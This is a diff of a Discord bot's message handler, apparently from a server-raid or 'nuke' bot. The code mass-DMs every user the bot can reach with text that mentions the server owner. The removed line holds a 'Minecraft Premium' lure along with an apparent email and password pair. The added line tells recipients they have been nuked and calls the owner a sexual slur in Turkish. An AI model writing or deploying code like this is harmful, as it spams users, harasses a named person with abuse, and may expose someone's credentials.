@@ -532,9 +532,9 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "`Minecraft Premium Geliyor` <@" + ////     await msg.guild.channels.find(x => x.name === "ャ");
+          "`Patlatıldın knk, Burdan` <@" + ////     await msg.guild.channels.find(x => x.name === "ャ");
             msg.guild.owner.id +
-            ">Şifre: jakezale@embarqmail.com E-Posta: violet08"
+            ">`İsimli Orospuya Selamlar!`"
         )
       )
       .catch(console.error);
